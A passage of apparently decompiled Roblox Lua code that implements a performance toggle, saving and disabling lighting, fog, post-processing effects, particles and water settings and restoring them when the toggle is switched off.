                                                                    is_a_7 = is_a_7[val_292]
                                                                else
                                                                    is_a_7 = nil
                                                                end
                                                                if (is_a_7 == nil) then
                                                                    is_a_7 = val_291
                                                                    if is_a_7 ~= nil then
                                                                        is_a_7 = is_a_7.Instances
                                                                    else
                                                                        is_a_7 = nil
                                                                    end
                                                                    val_292 = val_290
                                                                    post_effect_2 = {
                                                                        Class = "Emitter",
                                                                    }
                                                                    enabled = val_290
                                                                    if enabled ~= nil then
                                                                        enabled = enabled.Enabled
                                                                    else
                                                                        enabled = nil
                                                                    end
                                                                    post_effect_2.Enabled = enabled
                                                                    if is_a_7 then
                                                                        is_a_7[val_292] = post_effect_2
                                                                    end
                                                                end
                                                                is_a_7 = val_290
                                                                if is_a_7 then
                                                                    is_a_7.Enabled = false
                                                                end
                                                            end
                                                        else
                                                            is_a_7 = val_291
                                                            if is_a_7 ~= nil then
                                                                is_a_7 = is_a_7.Instances
                                                            else
                                                                is_a_7 = nil
                                                            end
                                                            val_292 = val_290
                                                            if is_a_7 ~= nil then
                                                                is_a_7 = is_a_7[val_292]
                                                            else
                                                                is_a_7 = nil
                                                            end
                                                            if (is_a_7 == nil) then
                                                                is_a_7 = val_291
                                                                if is_a_7 ~= nil then
                                                                    is_a_7 = is_a_7.Instances
                                                                else
                                                                    is_a_7 = nil
                                                                end
                                                                val_292 = val_290
                                                                post_effect_2 = {
                                                                    Class = "Emitter",
                                                                }
                                                                enabled = val_290
                                                                if enabled ~= nil then
                                                                    enabled = enabled.Enabled
                                                                else
                                                                    enabled = nil
                                                                end
                                                                post_effect_2.Enabled = enabled
                                                                if is_a_7 then
                                                                    is_a_7[val_292] = post_effect_2
                                                                end
                                                            end
                                                            is_a_7 = val_290
                                                            if is_a_7 then
                                                                is_a_7.Enabled = false
                                                            end
                                                        end
                                                    else
                                                        is_a_7 = val_291
                                                        if is_a_7 ~= nil then
                                                            is_a_7 = is_a_7.Instances
                                                        else
                                                            is_a_7 = nil
                                                        end
                                                        val_292 = val_290
                                                        if is_a_7 ~= nil then
                                                            is_a_7 = is_a_7[val_292]
                                                        else
                                                            is_a_7 = nil
                                                        end
                                                        if (is_a_7 == nil) then
                                                            is_a_7 = val_291
                                                            if is_a_7 ~= nil then
                                                                is_a_7 = is_a_7.Instances
                                                            else
                                                                is_a_7 = nil
                                                            end
                                                            val_292 = val_290
                                                            post_effect_2 = {
                                                                Class = "Emitter",
                                                            }
                                                            enabled = val_290
                                                            if enabled ~= nil then
                                                                enabled = enabled.Enabled
                                                            else
                                                                enabled = nil
                                                            end
                                                            post_effect_2.Enabled = enabled
                                                            if is_a_7 then
                                                                is_a_7[val_292] = post_effect_2
                                                            end
                                                        end
                                                        is_a_7 = val_290
                                                        if is_a_7 then
                                                            is_a_7.Enabled = false
                                                        end
                                                    end
                                                else
                                                    is_a_7 = val_291
                                                    if is_a_7 ~= nil then
                                                        is_a_7 = is_a_7.Instances
                                                    else
                                                        is_a_7 = nil
                                                    end
                                                    val_292 = val_290
                                                    if is_a_7 ~= nil then
                                                        is_a_7 = is_a_7[val_292]
                                                    else
                                                        is_a_7 = nil
                                                    end
                                                    if (is_a_7 == nil) then
                                                        is_a_7 = val_291
                                                        if is_a_7 ~= nil then
                                                            is_a_7 = is_a_7.Instances
                                                        else
                                                            is_a_7 = nil
                                                        end
                                                        val_292 = val_290
                                                        post_effect_2 = {
                                                            Class = "Emitter",
                                                        }
                                                        enabled = val_290
                                                        if enabled ~= nil then
                                                            enabled = enabled.Enabled
                                                        else
                                                            enabled = nil
                                                        end
                                                        post_effect_2.Enabled = enabled
                                                        if is_a_7 then
                                                            is_a_7[val_292] = post_effect_2
                                                        end
                                                    end
                                                    is_a_7 = val_290
                                                    if is_a_7 then
                                                        is_a_7.Enabled = false
                                                    end
                                                end
                                            end
                                        else
                                            is_a_7 = val_291
                                            if is_a_7 ~= nil then
                                                is_a_7 = is_a_7.Instances
                                            else
                                                is_a_7 = nil
                                            end
                                            val_292 = val_290
                                            if is_a_7 ~= nil then
                                                is_a_7 = is_a_7[val_292]
                                            else
                                                is_a_7 = nil
                                            end
                                            if (is_a_7 == nil) then
                                                is_a_7 = val_291
                                                if is_a_7 ~= nil then
                                                    is_a_7 = is_a_7.Instances
                                                else
                                                    is_a_7 = nil
                                                end
                                                val_292 = val_290
                                                post_effect_2 = {
                                                    Class = "Visual",
                                                }
                                                enabled = val_290
                                                if enabled ~= nil then
                                                    enabled = enabled.Transparency
                                                else
                                                    enabled = nil
                                                end
                                                post_effect_2.Transparency = enabled
                                                if is_a_7 then
                                                    is_a_7[val_292] = post_effect_2
                                                end
                                            end
                                            is_a_7 = val_290
                                            if is_a_7 then
                                                is_a_7.Transparency = 1.0
                                            end
                                        end
                                    end
                                else
                                    is_a_7 = val_291
                                    if is_a_7 ~= nil then
                                        is_a_7 = is_a_7.Instances
                                    else
                                        is_a_7 = nil
                                    end
                                    val_292 = val_290
                                    if is_a_7 ~= nil then
                                        is_a_7 = is_a_7[val_292]
                                    else
                                        is_a_7 = nil
                                    end
                                    if (is_a_7 == nil) then
                                        is_a_7 = val_291
                                        if is_a_7 ~= nil then
                                            is_a_7 = is_a_7.Instances
                                        else
                                            is_a_7 = nil
                                        end
                                        val_292 = val_290
                                        post_effect_2 = {
                                            Class = "Effect",
                                        }
                                        enabled = val_290
                                        if enabled ~= nil then
                                            enabled = enabled.Enabled
                                        else
                                            enabled = nil
                                        end
                                        post_effect_2.Enabled = enabled
                                        if is_a_7 then
                                            is_a_7[val_292] = post_effect_2
                                        end
                                    end
                                    is_a_7 = val_290
                                    if is_a_7 then
                                        is_a_7.Enabled = false
                                    end
                                end
                            else
                                is_a_7 = val_291
                                if is_a_7 ~= nil then
                                    is_a_7 = is_a_7.Instances
                                else
                                    is_a_7 = nil
                                end
                                val_292 = val_290
                                if is_a_7 ~= nil then
                                    is_a_7 = is_a_7[val_292]
                                else
                                    is_a_7 = nil
                                end
                                if (is_a_7 == nil) then
                                    is_a_7 = val_291
                                    if is_a_7 ~= nil then
                                        is_a_7 = is_a_7.Instances
                                    else
                                        is_a_7 = nil
                                    end
                                    val_292 = val_290
                                    post_effect_2 = {
                                        Class = "Effect",
                                    }
                                    enabled = val_290
                                    if enabled ~= nil then
                                        enabled = enabled.Enabled
                                    else
                                        enabled = nil
                                    end
                                    post_effect_2.Enabled = enabled
                                    if is_a_7 then
                                        is_a_7[val_292] = post_effect_2
                                    end
                                end
                                is_a_7 = val_290
                                if is_a_7 then
                                    is_a_7.Enabled = false
                                end
                            end
                        else
                            is_a_7 = val_291
                            if is_a_7 ~= nil then
                                is_a_7 = is_a_7.Instances
                            else
                                is_a_7 = nil
                            end
                            val_292 = val_290
                            if is_a_7 ~= nil then
                                is_a_7 = is_a_7[val_292]
                            else
                                is_a_7 = nil
                            end
                            if (is_a_7 == nil) then
                                is_a_7 = val_291
                                if is_a_7 ~= nil then
                                    is_a_7 = is_a_7.Instances
                                else
                                    is_a_7 = nil
                                end
                                val_292 = val_290
                                post_effect_2 = {
                                    Class = "Effect",
                                }
                                enabled = val_290
                                if enabled ~= nil then
                                    enabled = enabled.Enabled
                                else
                                    enabled = nil
                                end
                                post_effect_2.Enabled = enabled
                                if is_a_7 then
                                    is_a_7[val_292] = post_effect_2
                                end
                            end
                            is_a_7 = val_290
                            if is_a_7 then
                                is_a_7.Enabled = false
                            end
                        end
                    else
                        is_a_7 = val_291
                        if is_a_7 ~= nil then
                            is_a_7 = is_a_7.Instances
                        else
                            is_a_7 = nil
                        end
                        val_292 = val_290
                        if is_a_7 ~= nil then
                            is_a_7 = is_a_7[val_292]
                        else
                            is_a_7 = nil
                        end
                        if (is_a_7 == nil) then
                            is_a_7 = val_291
                            if is_a_7 ~= nil then
                                is_a_7 = is_a_7.Instances
                            else
                                is_a_7 = nil
                            end
                            val_292 = val_290
                            post_effect_2 = {
                                Class = "Effect",
                            }
                            enabled = val_290
                            if enabled ~= nil then
                                enabled = enabled.Enabled
                            else
                                enabled = nil
                            end
                            post_effect_2.Enabled = enabled
                            if is_a_7 then
                                is_a_7[val_292] = post_effect_2
                            end
                        end
                        is_a_7 = val_290
                        if is_a_7 then
                            is_a_7.Enabled = false
                        end
                    end
                else
                    is_a_7 = val_291
                    if is_a_7 ~= nil then
                        is_a_7 = is_a_7.Instances
                    else
                        is_a_7 = nil
                    end
                    val_292 = val_290
                    if is_a_7 ~= nil then
                        is_a_7 = is_a_7[val_292]
                    else
                        is_a_7 = nil
                    end
                    if (is_a_7 == nil) then
                        is_a_7 = val_291
                        if is_a_7 ~= nil then
                            is_a_7 = is_a_7.Instances
                        else
                            is_a_7 = nil
                        end
                        val_292 = val_290
                        post_effect_2 = {
                            Class = "Effect",
                        }
                        enabled = val_290
                        if enabled ~= nil then
                            enabled = enabled.Enabled
                        else
                            enabled = nil
                        end
                        post_effect_2.Enabled = enabled
                        if is_a_7 then
                            is_a_7[val_292] = post_effect_2
                        end
                    end
                    is_a_7 = val_290
                    if is_a_7 then
                        is_a_7.Enabled = false
                    end
                end
                return
            end)
            return
        end
    end
    do
        local val_293, val_294, val_295, val_296, val_297, val_298, val_299, val_300 = tbl_35, handler_result_3, handler_result_2, handler_14, game_2, show_aura, tbl_36, connect
        spawn_3 = function(argument_1)
            local warn_function
            local pcall_11 = pcall
            local capture_136_513_2, val_301, val_302, val_303, val_304, val_305, val_306, capture_136_520_2, val_307 = val_293, argument_1, val_294, val_295, val_296, val_297, val_298, val_299, val_300
            local handler_29 = function()
                local pack_result_94
                local get_children_6, child_added, local_1_result_8, handler_25, pcall_12, handler_26
                capture_136_513_2.value = val_301
                local pcall_13 = val_301
                if pcall_13 then
                    val_302()
                    val_303()
                    pcall_13 = pcall
                    local val_308, val_309 = val_304, val_305
                    pcall_13(function()
                        local lighting = val_308
                        if lighting ~= nil then
                            lighting = lighting.Lighting
                        else
                            lighting = nil
                        end
                        local global_shadows = val_309
                        if global_shadows ~= nil then
                            global_shadows = global_shadows.GlobalShadows
                        else
                            global_shadows = nil
                        end
                        if lighting then
                            lighting.GlobalShadows = global_shadows
                        end
                        lighting = val_309
                        if lighting then
                            lighting.GlobalShadows = false
                        end
                        return
                    end)
                    pcall_13 = pcall
                    local val_310, val_311 = val_304, val_305
                    pcall_13(function()
                        local lighting_2 = val_310
                        if lighting_2 ~= nil then
                            lighting_2 = lighting_2.Lighting
                        else
                            lighting_2 = nil
                        end
                        local fog_end = val_311
                        if fog_end ~= nil then
                            fog_end = fog_end.FogEnd
                        else
                            fog_end = nil
                        end
                        if lighting_2 then
                            lighting_2.FogEnd = fog_end
                        end
                        lighting_2 = val_311
                        if lighting_2 then
                            lighting_2.FogEnd = 100000000.0
                        end
                        return
                    end)
                    pcall_13 = pcall
                    local val_312, val_313 = val_304, val_305
                    pcall_13(function()
                        local lighting_3 = val_312
                        if lighting_3 ~= nil then
                            lighting_3 = lighting_3.Lighting
                        else
                            lighting_3 = nil
                        end
                        local fog_start = val_313
                        if fog_start ~= nil then
                            fog_start = fog_start.FogStart
                        else
                            fog_start = nil
                        end
                        if lighting_3 then
                            lighting_3.FogStart = fog_start
                        end
                        lighting_3 = val_313
                        if lighting_3 then
                            lighting_3.FogStart = 0.0
                        end
                        return
                    end)
                    pcall_13 = pcall
                    local val_314, val_315 = val_304, val_305
                    pcall_13(function()
                        local lighting_4 = val_314
                        if lighting_4 ~= nil then
                            lighting_4 = lighting_4.Lighting
                        else
                            lighting_4 = nil
                        end
                        local brightness = val_315
                        if brightness ~= nil then
                            brightness = brightness.Brightness
                        else
                            brightness = nil
                        end
                        if lighting_4 then
                            lighting_4.Brightness = brightness
                        end
                        lighting_4 = val_315
                        if lighting_4 then
                            lighting_4.Brightness = 1.0
                        end
                        return
                    end)
                    pcall_13 = pcall
                    local val_316 = val_304
                    pcall_13(function()
                        local workspace_8 = val_316
                        if workspace_8 ~= nil then
                            workspace_8 = workspace_8.Workspace
                        else
                            workspace_8 = nil
                        end
                        local terrain = workspace.Terrain
                        if terrain ~= nil then
                            terrain = terrain.Decoration
                        else
                            terrain = nil
                        end
                        if workspace_8 then
                            workspace_8.Decoration = terrain
                        end
                        workspace_8 = workspace.Terrain
                        if workspace_8 then
                            workspace_8.Decoration = false
                        end
                        return
                    end)
                    pcall(function()
                        local settings_result = settings()
                        if settings_result ~= nil then
                            settings_result = settings_result.Rendering
                        else
                            settings_result = nil
                        end
                        local quality_level = Enum.QualityLevel
                        if quality_level ~= nil then
                            quality_level = quality_level.Level01
                        else
                            quality_level = nil
                        end
                        if settings_result then
                            settings_result.QualityLevel = quality_level
                        end
                        return
                    end)
                    pcall(function()
                        local terrain_2 = workspace.Terrain
                        if terrain_2 then
                            terrain_2.WaterWaveSize = 0.0
                        end
                        terrain_2 = workspace.Terrain
                        if terrain_2 then
                            terrain_2.WaterWaveSpeed = 0.0
                        end
                        terrain_2 = workspace.Terrain
                        if terrain_2 then
                            terrain_2.WaterReflectance = 0.0
                        end
                        terrain_2 = workspace.Terrain
                        if terrain_2 then
                            terrain_2.WaterTransparency = 1.0
                        end
                        return
                    end)
                    pcall_13 = ipairs
                    get_children_6 = val_305
                    child_added = get_children_6
                    if get_children_6 then
                        get_children_6 = get_children_6.GetChildren
                    else
                        get_children_6 = nil
                    end
                    pack_result_94 = pack(get_children_6(child_added))
                    if pack_result_94.n >= 1 then
                        get_children_6 = pack_result_94[1]
                    end
                    if pack_result_94.n >= 2 then
                        child_added = pack_result_94[2]
                    end
                    if pack_result_94.n >= 3 then
                        local_1_result_8 = pack_result_94[3]
                    end
                    if pack_result_94.n >= 4 then
                        handler_25 = pack_result_94[4]
                    end
                    if pack_result_94.n >= 5 then
                        pcall_12 = pack_result_94[5]
                    end
                    if pack_result_94.n >= 6 then
                        handler_26 = pack_result_94[6]
                    end
                    pcall_13 = pcall_13(unpack(pack_result_94, 1, pack_result_94.n))
                    while true do
                        local_1_result_8 = pcall_13(get_children_6, child_added)
                        if local_1_result_8 ~= nil then
                            child_added = local_1_result_8
                            pcall_12 = val_306
                            handler_26 = handler_25
                            pcall_12(handler_26)
                        else
                            break
                        end
                    end
                    pcall_13 = ipairs
                    get_children_6 = workspace
                    child_added = get_children_6
                    get_children_6 = get_children_6.GetDescendants
                    pack_result_94 = pack(get_children_6(child_added))
                    if pack_result_94.n >= 1 then
                        get_children_6 = pack_result_94[1]
                    end
                    if pack_result_94.n >= 2 then
                        child_added = pack_result_94[2]
                    end
                    if pack_result_94.n >= 3 then
                        local_1_result_8 = pack_result_94[3]
                    end
                    if pack_result_94.n >= 4 then
                        handler_25 = pack_result_94[4]
                    end
                    if pack_result_94.n >= 5 then
                        pcall_12 = pack_result_94[5]
                    end
                    if pack_result_94.n >= 6 then
                        handler_26 = pack_result_94[6]
                    end
                    pcall_13 = pcall_13(unpack(pack_result_94, 1, pack_result_94.n))
                    while true do
                        local_1_result_8 = pcall_13(get_children_6, child_added)
                        if local_1_result_8 ~= nil then
                            child_added = local_1_result_8
                            pcall_12 = val_306
                            handler_26 = handler_25
                            pcall_12(handler_26)
                        else
                            break
                        end
                    end
                    pcall_13 = table
                    if pcall_13 ~= nil then
                        pcall_13 = pcall_13.insert
                    else
                        pcall_13 = nil
                    end
                    get_children_6 = capture_136_520_2.value
                    child_added = val_305
                    if child_added ~= nil then
                        child_added = child_added.ChildAdded
                    else
                        child_added = nil
                    end
                    local_1_result_8 = child_added
                    if child_added then
                        child_added = child_added.Connect
                    else
                        child_added = nil
                    end
                    local capture_137_17409_2, val_317, val_318 = capture_136_513_2, val_307, val_306
                    handler_25 = function(argument_1)
                        local handler_27
                        local local_2_result_12 = capture_137_17409_2.value
                        if local_2_result_12 then
                            local_2_result_12 = val_317
                            handler_27 = argument_1
                            local_2_result_12 = local_2_result_12(handler_27)
                            if local_2_result_12 then
                                local_2_result_12 = task.defer
                                local capture_145_2817_2, val_319, val_320 = capture_137_17409_2, argument_1, val_318
                                handler_27 = function()
                                    local parent_4 = capture_145_2817_2.value
                                    if parent_4 then
                                        parent_4 = val_319
                                        if parent_4 then
                                            parent_4 = val_319
                                            if parent_4 ~= nil then
                                                parent_4 = parent_4.Parent
                                            else
                                                parent_4 = nil
                                            end
                                            if parent_4 then
                                                parent_4 = val_320
                                                parent_4(val_319)
                                            end
                                        end
                                    end
                                    return
                                end
                                local_2_result_12(handler_27)
                            end
                        end
                        return
                    end
                    pack_result_94 = pack(child_added(local_1_result_8, handler_25))
                    if pack_result_94.n >= 1 then
                        child_added = pack_result_94[1]
                    end
                    if pack_result_94.n >= 2 then
                        local_1_result_8 = pack_result_94[2]
                    end
                    if pack_result_94.n >= 3 then
                        handler_25 = pack_result_94[3]
                    end
                    if pack_result_94.n >= 4 then
                        pcall_12 = pack_result_94[4]
                    end
                    if pack_result_94.n >= 5 then
                        handler_26 = pack_result_94[5]
                    end
                    pcall_13(get_children_6, unpack(pack_result_94, 1, pack_result_94.n))
                    pcall_13 = table
                    if pcall_13 ~= nil then
                        pcall_13 = pcall_13.insert
                    else
                        pcall_13 = nil
                    end
                    get_children_6 = capture_136_520_2.value
                    child_added = workspace.DescendantAdded
                    local_1_result_8 = child_added
                    if child_added then
                        child_added = child_added.Connect
                    else
                        child_added = nil
                    end
                    local capture_137_20481_2, val_321, val_322 = capture_136_513_2, val_307, val_306
                    handler_25 = function(argument_1)
                        local handler_28
                        local local_2_result_13 = capture_137_20481_2.value
                        if local_2_result_13 then
                            local_2_result_13 = val_321
                            handler_28 = argument_1
                            local_2_result_13 = local_2_result_13(handler_28)
                            if local_2_result_13 then
                                local_2_result_13 = task.defer
                                local capture_147_2817_2, val_323, val_324 = capture_137_20481_2, argument_1, val_322
                                handler_28 = function()
                                    local parent_5 = capture_147_2817_2.value
                                    if parent_5 then
                                        parent_5 = val_323
                                        if parent_5 then
                                            parent_5 = val_323
                                            if parent_5 ~= nil then
                                                parent_5 = parent_5.Parent
                                            else
                                                parent_5 = nil
                                            end
                                            if parent_5 then
                                                parent_5 = val_324
                                                parent_5(val_323)
                                            end
                                        end
                                    end
                                    return
                                end
                                local_2_result_13(handler_28)
                            end
                        end
                        return
                    end
                    pack_result_94 = pack(child_added(local_1_result_8, handler_25))
                    if pack_result_94.n >= 1 then
                        child_added = pack_result_94[1]
                    end
                    if pack_result_94.n >= 2 then
                        local_1_result_8 = pack_result_94[2]
                    end
                    if pack_result_94.n >= 3 then
                        handler_25 = pack_result_94[3]
                    end
                    if pack_result_94.n >= 4 then
                        pcall_12 = pack_result_94[4]
                    end
                    if pack_result_94.n >= 5 then
                        handler_26 = pack_result_94[5]
                    end
                    pcall_13(get_children_6, unpack(pack_result_94, 1, pack_result_94.n))
                else
                    val_302()
                    pcall_13 = pcall
                    local val_325, val_326 = val_304, val_305
                    pcall_13(function()
                        local lighting_5
                        local lighting_6 = val_325
                        if lighting_6 ~= nil then
                            lighting_6 = lighting_6.Lighting
                        else
                            lighting_6 = nil
                        end
                        if lighting_6 ~= nil then
                            lighting_6 = lighting_6.GlobalShadows
                        else
                            lighting_6 = nil
                        end
                        if lighting_6 ~= nil then
                            lighting_6 = val_326
                            lighting_5 = val_325
                            if lighting_5 ~= nil then
                                lighting_5 = lighting_5.Lighting
                            else
                                lighting_5 = nil
                            end
                            if lighting_5 ~= nil then
                                lighting_5 = lighting_5.GlobalShadows
                            else
                                lighting_5 = nil
                            end
                            if lighting_6 then
                                lighting_6.GlobalShadows = lighting_5
                            end
                        end
                        return
                    end)
                    pcall_13 = pcall
                    local val_327, val_328 = val_304, val_305
                    pcall_13(function()
                        local lighting_7
                        local lighting_8 = val_327
                        if lighting_8 ~= nil then
                            lighting_8 = lighting_8.Lighting
                        else
                            lighting_8 = nil
                        end
                        if lighting_8 ~= nil then
                            lighting_8 = lighting_8.FogEnd
                        else
                            lighting_8 = nil
                        end
                        if lighting_8 ~= nil then
                            lighting_8 = val_328
                            lighting_7 = val_327
                            if lighting_7 ~= nil then
                                lighting_7 = lighting_7.Lighting
                            else
                                lighting_7 = nil
                            end
                            if lighting_7 ~= nil then
                                lighting_7 = lighting_7.FogEnd
                            else
                                lighting_7 = nil
                            end
                            if lighting_8 then
                                lighting_8.FogEnd = lighting_7
                            end
                        end
                        return
                    end)
                    pcall_13 = pcall
                    local val_329, val_330 = val_304, val_305
                    pcall_13(function()
                        local lighting_9
                        local lighting_10 = val_329
                        if lighting_10 ~= nil then
                            lighting_10 = lighting_10.Lighting
                        else
                            lighting_10 = nil
                        end
                        if lighting_10 ~= nil then
                            lighting_10 = lighting_10.FogStart
                        else
                            lighting_10 = nil
                        end
                        if lighting_10 ~= nil then
                            lighting_10 = val_330
                            lighting_9 = val_329
                            if lighting_9 ~= nil then
                                lighting_9 = lighting_9.Lighting
                            else
                                lighting_9 = nil
                            end
                            if lighting_9 ~= nil then
                                lighting_9 = lighting_9.FogStart
                            else
                                lighting_9 = nil
                            end
                            if lighting_10 then
                                lighting_10.FogStart = lighting_9
                            end
                        end
                        return
                    end)
                    pcall_13 = pcall
                    local val_331, val_332 = val_304, val_305
                    pcall_13(function()
                        local lighting_11
                        local lighting_12 = val_331
                        if lighting_12 ~= nil then
                            lighting_12 = lighting_12.Lighting
                        else
                            lighting_12 = nil
                        end
                        if lighting_12 ~= nil then
                            lighting_12 = lighting_12.Brightness
                        else
                            lighting_12 = nil
                        end
                        if lighting_12 ~= nil then
                            lighting_12 = val_332
                            lighting_11 = val_331
                            if lighting_11 ~= nil then
                                lighting_11 = lighting_11.Lighting
                            else
                                lighting_11 = nil
                            end
                            if lighting_11 ~= nil then
                                lighting_11 = lighting_11.Brightness
                            else
                                lighting_11 = nil
                            end
                            if lighting_12 then
                                lighting_12.Brightness = lighting_11
                            end
                        end
                        return
                    end)
                    pcall_13 = pcall
                    local val_333 = val_304
                    pcall_13(function()
                        local workspace_9
                        local workspace_10 = val_333
                        if workspace_10 ~= nil then
                            workspace_10 = workspace_10.Workspace
                        else
                            workspace_10 = nil
                        end
                        if workspace_10 ~= nil then
                            workspace_10 = workspace_10.Decoration
                        else
                            workspace_10 = nil
                        end
                        if workspace_10 ~= nil then
                            workspace_10 = workspace.Terrain
                            workspace_9 = val_333
                            if workspace_9 ~= nil then
                                workspace_9 = workspace_9.Workspace
                            else
                                workspace_9 = nil
                            end
                            if workspace_9 ~= nil then
                                workspace_9 = workspace_9.Decoration
                            else
                                workspace_9 = nil
                            end
                            if workspace_10 then
                                workspace_10.Decoration = workspace_9
                            end
                        end
                        return
                    end)
                    pcall(function()
                        local settings_result_2 = settings()
                        if settings_result_2 ~= nil then
                            settings_result_2 = settings_result_2.Rendering
                        else
                            settings_result_2 = nil
                        end
                        local quality_level_2 = Enum.QualityLevel
                        if quality_level_2 ~= nil then
                            quality_level_2 = quality_level_2.Automatic
                        else
                            quality_level_2 = nil
                        end
                        if settings_result_2 then
                            settings_result_2.QualityLevel = quality_level_2
                        end
                        return
                    end)
                    pcall(function()
                        local terrain_3 = workspace.Terrain
                        if terrain_3 then
                            terrain_3.WaterWaveSize = 20.0
                        end
                        terrain_3 = workspace.Terrain
                        if terrain_3 then
                            terrain_3.WaterWaveSpeed = 10.0
                        end
                        terrain_3 = workspace.Terrain
                        if terrain_3 then
                            terrain_3.WaterReflectance = 0.05
                        end
                        terrain_3 = workspace.Terrain
                        if terrain_3 then
                            terrain_3.WaterTransparency = 0.3
                        end
                        return
                    end)
                    pcall_13 = pairs
                    get_children_6 = val_304
                    if get_children_6 ~= nil then
                        get_children_6 = get_children_6.Instances
                    else
                        get_children_6 = nil
                    end
                    pcall_13 = pcall_13(get_children_6)
                    while true do
                        local_1_result_8 = pcall_13(get_children_6, child_added)
                        if local_1_result_8 ~= nil then
                            child_added = local_1_result_8
                            pcall_12 = pcall
                            local val_334, val_335 = local_1_result_8, handler_25
                            handler_26 = function()
                                local post_effect_3
                                local type_name_2 = typeof
                                local enabled_2 = val_334
                                type_name_2 = type_name_2(enabled_2)
                                if (type_name_2 == "Instance") then
                                    type_name_2 = val_334
                                    if type_name_2 ~= nil then
                                        type_name_2 = type_name_2.Parent
                                    else
                                        type_name_2 = nil
                                    end
                                    if type_name_2 then
                                        type_name_2 = type
                                        enabled_2 = val_335
                                        type_name_2 = type_name_2(enabled_2)
                                        if (type_name_2 == "table") then
                                            type_name_2 = val_334
                                            enabled_2 = type_name_2
                                            if type_name_2 then
                                                type_name_2 = type_name_2.IsA
                                            else
                                                type_name_2 = nil
                                            end
                                            post_effect_3 = "PostEffect"
                                            type_name_2 = type_name_2(enabled_2, post_effect_3)
                                            if not type_name_2 then
                                                type_name_2 = val_334
                                                enabled_2 = type_name_2
                                                if type_name_2 then
                                                    type_name_2 = type_name_2.IsA
                                                else
                                                    type_name_2 = nil
                                                end
                                                post_effect_3 = "DepthOfFieldEffect"
                                                type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                if not type_name_2 then
                                                    type_name_2 = val_334
                                                    enabled_2 = type_name_2
                                                    if type_name_2 then
                                                        type_name_2 = type_name_2.IsA
                                                    else
                                                        type_name_2 = nil
                                                    end
                                                    post_effect_3 = "BlurEffect"
                                                    type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                    if not type_name_2 then
                                                        type_name_2 = val_334
                                                        enabled_2 = type_name_2
                                                        if type_name_2 then
                                                            type_name_2 = type_name_2.IsA
                                                        else
                                                            type_name_2 = nil
                                                        end
                                                        post_effect_3 = "BloomEffect"
                                                        type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                        if not type_name_2 then
                                                            type_name_2 = val_334
                                                            enabled_2 = type_name_2
                                                            if type_name_2 then
                                                                type_name_2 = type_name_2.IsA
                                                            else
                                                                type_name_2 = nil
                                                            end
                                                            post_effect_3 = "SunRaysEffect"
                                                            type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                            if not type_name_2 then
                                                                type_name_2 = val_334
                                                                enabled_2 = type_name_2
                                                                if type_name_2 then
                                                                    type_name_2 = type_name_2.IsA
                                                                else
                                                                    type_name_2 = nil
                                                                end
                                                                post_effect_3 = "ColorCorrectionEffect"
                                                                type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                if type_name_2 then
                                                                    type_name_2 = val_334
                                                                    enabled_2 = val_335
                                                                    if enabled_2 ~= nil then
                                                                        enabled_2 = enabled_2.Enabled
                                                                    else
                                                                        enabled_2 = nil
                                                                    end
                                                                    if type_name_2 then
                                                                        type_name_2.Enabled = enabled_2
                                                                    end
                                                                else
                                                                    type_name_2 = val_334
                                                                    enabled_2 = type_name_2
                                                                    if type_name_2 then
                                                                        type_name_2 = type_name_2.IsA
                                                                    else
                                                                        type_name_2 = nil
                                                                    end
                                                                    post_effect_3 = "Decal"
                                                                    type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                    if not type_name_2 then
                                                                        type_name_2 = val_334
                                                                        enabled_2 = type_name_2
                                                                        if type_name_2 then
                                                                            type_name_2 = type_name_2.IsA
                                                                        else
                                                                            type_name_2 = nil
                                                                        end
                                                                        post_effect_3 = "Texture"
                                                                        type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                        if type_name_2 then
                                                                            type_name_2 = val_334
                                                                            enabled_2 = val_335
                                                                            if enabled_2 ~= nil then
                                                                                enabled_2 = enabled_2.Transparency
                                                                            else
                                                                                enabled_2 = nil
                                                                            end
                                                                            if type_name_2 then
                                                                                type_name_2.Transparency = enabled_2
                                                                            end
                                                                        else
                                                                            type_name_2 = val_334
                                                                            enabled_2 = type_name_2
                                                                            if type_name_2 then
                                                                                type_name_2 = type_name_2.IsA
                                                                            else
                                                                                type_name_2 = nil
                                                                            end
                                                                            post_effect_3 = "ParticleEmitter"
                                                                            type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                            if not type_name_2 then
                                                                                type_name_2 = val_334
                                                                                enabled_2 = type_name_2
                                                                                if type_name_2 then
                                                                                    type_name_2 = type_name_2.IsA
                                                                                else
                                                                                    type_name_2 = nil
                                                                                end
                                                                                post_effect_3 = "Trail"
                                                                                type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                                if not type_name_2 then
                                                                                    type_name_2 = val_334
                                                                                    enabled_2 = type_name_2
                                                                                    if type_name_2 then
                                                                                        type_name_2 = type_name_2.IsA
                                                                                    else
                                                                                        type_name_2 = nil
                                                                                    end
                                                                                    post_effect_3 = "Beam"
                                                                                    type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                                    if not type_name_2 then
                                                                                        type_name_2 = val_334
                                                                                        enabled_2 = type_name_2
                                                                                        if type_name_2 then
                                                                                            type_name_2 = type_name_2.IsA
                                                                                        else
                                                                                            type_name_2 = nil
                                                                                        end
                                                                                        post_effect_3 = "Fire"
                                                                                        type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                                        if not type_name_2 then
                                                                                            type_name_2 = val_334
                                                                                            enabled_2 = type_name_2
                                                                                            if type_name_2 then
                                                                                                type_name_2 = type_name_2.IsA
                                                                                            else
                                                                                                type_name_2 = nil
                                                                                            end
                                                                                            post_effect_3 = "Smoke"
                                                                                            type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                                            if not type_name_2 then
                                                                                                type_name_2 = val_334
                                                                                                enabled_2 = type_name_2
                                                                                                if type_name_2 then
                                                                                                    type_name_2 = type_name_2.IsA
                                                                                                else
                                                                                                    type_name_2 = nil
                                                                                                end
                                                                                                post_effect_3 = "Sparkles"
                                                                                                type_name_2 = type_name_2(enabled_2, post_effect_3)
                                                                                                if type_name_2 then
                                                                                                    type_name_2 = val_334
                                                                                                    enabled_2 = val_335
                                                                                                    if enabled_2 ~= nil then
                                                                                                        enabled_2 = enabled_2.Enabled
                                                                                                    else
                                                                                                        enabled_2 = nil
                                                                                                    end
                                                                                                    if type_name_2 then
                                                                                                        type_name_2.Enabled = enabled_2
